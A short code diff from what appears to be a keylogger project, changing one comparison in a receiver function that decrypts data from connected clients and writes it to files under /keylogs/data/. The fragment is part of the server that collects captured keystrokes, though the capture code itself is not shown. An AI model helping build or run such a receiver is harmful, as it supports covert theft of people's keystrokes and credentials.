@@ -176,7 +176,7 @@ def receiver(port):
                 f.write(dechiffrement(data))
                 print(f"\n{client_address} - ONLINE")
                 print("Update sur /keylogs/data/" + ficname)
-            if dechiffrement(data) != "" :
+            if str(dechiffrement(data)) != "" :
                 buffer_time = 0
             else:
                 buffer_time = buffer_time + 1
